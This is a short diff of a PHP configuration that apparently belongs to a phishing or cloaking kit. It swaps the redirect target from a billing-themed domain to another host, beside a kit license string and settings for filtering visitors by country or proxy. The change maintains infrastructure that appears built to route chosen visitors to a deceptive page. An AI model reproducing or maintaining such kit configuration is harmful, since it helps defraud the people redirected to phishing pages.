@@ -57,7 +57,7 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://server-bill.info/en-us/";
+$redirect = "https://75798b6045.lb3.amezmo.co/en-au";
 
 $parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
